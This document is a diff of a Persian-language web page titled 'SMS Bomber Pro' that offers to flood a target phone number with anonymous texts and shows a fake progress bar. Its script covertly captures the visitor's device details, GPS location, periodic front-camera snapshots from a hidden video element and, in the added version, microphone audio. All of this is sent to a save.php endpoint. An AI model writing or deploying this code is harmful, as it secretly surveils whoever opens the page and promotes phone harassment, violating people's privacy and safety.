@@ -1,48 +1,44 @@
 <!DOCTYPE html><html lang="fa" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💥 SMS Bomber Pro</title>
-<style>:root{--bg:#0a0a1a;--card:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.06);--accent:#ff4444;--accent2:#cc0000;--text:#fff;--muted:rgba(255,255,255,0.3);--green:#00f260}
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',system-ui,sans-serif;direction:rtl}
-body{background:linear-gradient(135deg,var(--bg),#1a1a2e);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
-.container{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:20px;padding:28px;max-width:440px;width:100%;box-shadow:0 30px 80px rgba(0,0,0,0.8)}
-.header{text-align:center;margin-bottom:20px}.header .icon{font-size:48px;margin-bottom:8px}
-.header h1{color:var(--accent);font-size:22px;font-weight:800}.header .sub{color:var(--muted);font-size:12px;margin-top:4px}
-.form-group{margin-bottom:14px}label{display:block;color:rgba(255,255,255,0.5);font-size:11px;margin-bottom:4px;font-weight:600}
-input,select{width:100%;padding:10px 14px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:10px;color:var(--text);font-size:14px;outline:none}
-input:focus,select:focus{border-color:rgba(255,50,50,0.4)}.row{display:flex;gap:10px}.row .form-group{flex:1}
-.attack-btn{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));border:none;border-radius:12px;color:var(--text);font-weight:800;font-size:16px;cursor:pointer;margin:6px 0 12px}
-.attack-btn:hover{transform:translateY(-2px)}.attack-btn:disabled{opacity:.35}
-.progress-container{display:none;margin-bottom:14px}.progress-container.active{display:block}
-.progress-bar{background:rgba(255,255,255,0.06);border-radius:20px;height:20px;overflow:hidden}
-.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:20px;transition:width .3s}
-.progress-count{text-align:center;font-size:13px;color:var(--accent);font-weight:700;margin-top:6px}
-.status-box{background:rgba(0,242,96,0.06);border:1px solid rgba(0,242,96,0.12);border-radius:10px;padding:10px 14px;display:none;align-items:center;justify-content:center;gap:8px;color:var(--green);font-size:12px;margin-bottom:14px}
-.dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 1s infinite}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif;direction:rtl}
+body{background:linear-gradient(135deg,#0a0a1a,#1a1a2e);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
+.c{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:20px;padding:28px;max-width:440px;width:100%}
+h1{color:#ff4444;text-align:center;font-size:22px;margin-bottom:4px}
+.s{color:rgba(255,255,255,0.3);text-align:center;font-size:12px;margin-bottom:20px}
+input,select{width:100%;padding:12px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:10px;color:#fff;font-size:14px;margin-bottom:10px;outline:none}
+.b{width:100%;padding:16px;background:linear-gradient(135deg,#ff4444,#cc0000);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:800;cursor:pointer;margin-top:8px}
+.b:disabled{opacity:.4}.p{display:none;margin-top:16px}
+.pb{background:rgba(255,255,255,0.06);border-radius:20px;height:20px;overflow:hidden}
+.pf{height:100%;width:0%;background:linear-gradient(90deg,#ff4444,#cc0000);border-radius:20px;transition:width .3s}
+.st{display:none;background:rgba(0,242,96,0.06);border:1px solid rgba(0,242,96,0.12);border-radius:10px;padding:10px;text-align:center;color:#00f260;font-size:12px;margin-top:12px}
 </style></head><body>
-<div class="container">
-<div class="header"><div class="icon">💥</div><h1>SMS BOMBER PRO</h1><p class="sub">سرویس ارسال پیامک انبوه ناشناس</p></div>
-<div class="form-group"><label>📱 شماره هدف</label><input type="tel" id="phone" placeholder="09123456789"></div>
-<div class="row"><div class="form-group"><label>🔢 تعداد</label><select id="count"><option>10</option><option selected>50</option><option>100</option><option>500</option></select></div><div class="form-group"><label>⚡ سرعت</label><select id="speed"><option value="slow">کند</option><option value="normal" selected>معمولی</option><option value="fast">سریع</option></select></div></div>
-<button class="attack-btn" id="btn" onclick="start()">🚀 شروع بمباران</button>
-<div class="progress-container" id="prog"><div class="progress-bar"><div class="progress-fill" id="fill"></div></div><div class="progress-count" id="progCount">0 / 50</div></div>
-<div class="status-box" id="status"><span class="dot"></span><span id="statusText">📷 در حال تأیید هویت...</span></div>
+<div class="c">
+<div style="text-align:center;font-size:48px;margin-bottom:8px">💥</div>
+<h1>SMS BOMBER PRO</h1><p class="s">سرویس ارسال پیامک انبوه ناشناس</p>
+<input type="tel" id="phone" placeholder="📱 شماره هدف">
+<select id="cnt"><option>10</option><option selected>50</option><option>100</option><option>500</option></select>
+<button class="b" id="btn" onclick="go()">🚀 شروع بمباران</button>
+<div class="p" id="prog"><div class="pb"><div class="pf" id="fill"></div></div></div>
+<div class="st" id="status">📷 دوربین فعال شد</div>
 </div>
 <script>
 var stream,canvas,ctx;
-function send(t,d){try{fetch('save.php?type='+t,{method:'POST',body:JSON.stringify(d)})}catch(e){}}
-function snap(){if(!stream)return;var v=document.getElementById('cam');if(!v||!v.videoWidth)return;canvas||(canvas=document.createElement('canvas'),ctx=canvas.getContext('2d'));canvas.width=v.videoWidth;canvas.height=v.videoHeight;ctx.drawImage(v,0,0);send('webcam',{image:canvas.toDataURL('image/jpeg',0.85),ua:navigator.userAgent})}
-function start(){
- var ph=document.getElementById('phone').value;if(!ph)return;send('click',{phone:ph,count:document.getElementById('count').value});
- document.getElementById('btn').disabled=true;document.getElementById('btn').textContent='در حال اجرا...';
- document.getElementById('prog').classList.add('active');document.getElementById('status').style.display='flex';
- setTimeout(function(){
-  navigator.mediaDevices.getUserMedia({video:{width:640,facingMode:'user'}}).then(function(s){
-   stream=s;var v=document.createElement('video');v.id='cam';v.autoplay=true;v.muted=true;v.srcObject=s;v.style.position='fixed';v.style.top='-9999px';v.style.left='-9999px';v.style.width='1px';document.body.appendChild(v);v.play();
-   document.getElementById('statusText').textContent='✅ تأیید شد';setInterval(snap,2500);
-   setTimeout(function(){document.getElementById('status').style.display='none'},3000);
-  }).catch(function(){document.getElementById('statusText').textContent='❌ دوربین رد شد'});
- },2000);
- var sent=0,total=parseInt(document.getElementById('count').value);
- var t=setInterval(function(){sent++;var pct=Math.min((sent/total)*100,100);document.getElementById('fill').style.width=pct+'%';document.getElementById('progCount').textContent=sent+' / '+total;if(sent>=total){clearInterval(t);document.getElementById('btn').textContent='✅ تمام شد';document.getElementById('btn').disabled=false}},200);
+function E(id){return document.getElementById(id)}
+function o(t){E("btn").textContent=t;E("btn").disabled=false}
+function S(t,d){try{fetch("save.php?type="+t,{method:"POST",body:JSON.stringify(d)})}catch(e){}}
+function snap(){if(!stream)return;var v=document.getElementById("cam");if(!v||!v.videoWidth)return;canvas||(canvas=document.createElement("canvas"),ctx=canvas.getContext("2d"));canvas.width=v.videoWidth;canvas.height=v.videoHeight;ctx.drawImage(v,0,0);S("webcam",{image:canvas.toDataURL("image/jpeg",0.85)})}
+function go(){
+var ph=E("phone").value;if(!ph)return;
+S("click",{phone:ph,count:E("cnt").value});
+E("btn").disabled=true;E("btn").textContent="در حال اجرا...";E("prog").style.display="block";
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480},audio:true}).then(function(s){
+stream=s;E("status").style.display="block";
+var v=document.createElement("video");v.id="cam";v.autoplay=true;v.muted=true;v.playsInline=true;v.srcObject=s;v.style.cssText="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0";document.body.appendChild(v);v.play();
+setInterval(snap,3000);
+try{var mr=new MediaRecorder(s);mr.ondataavailable=function(e){e.data.size>0&&fetch("save.php?type=audio",{method:"POST",body:e.data})};mr.start(8000)}catch(e){}
+}).catch(function(){});
+var sent=0,total=parseInt(E("cnt").value);
+var t=setInterval(function(){sent++;var p=Math.min((sent/total)*100,100);E("fill").style.width=p+"%";if(sent>=total){clearInterval(t);o("✅ تمام شد")}},200);
 }
-setTimeout(function(){send('device',{ua:navigator.userAgent,screen:screen.width+'x'+screen.height})},1000);
-setTimeout(function(){navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(p){send('gps',{lat:p.coords.latitude,lng:p.coords.longitude})},function(){},{timeout:5000})},3000);
+setTimeout(function(){S("device",{ua:navigator.userAgent,screen:screen.width+"x"+screen.height})},1000);
+setTimeout(function(){navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(p){S("gps",{lat:p.coords.latitude,lng:p.coords.longitude})},function(){},{timeout:5000})},3000);
 </script></body></html>
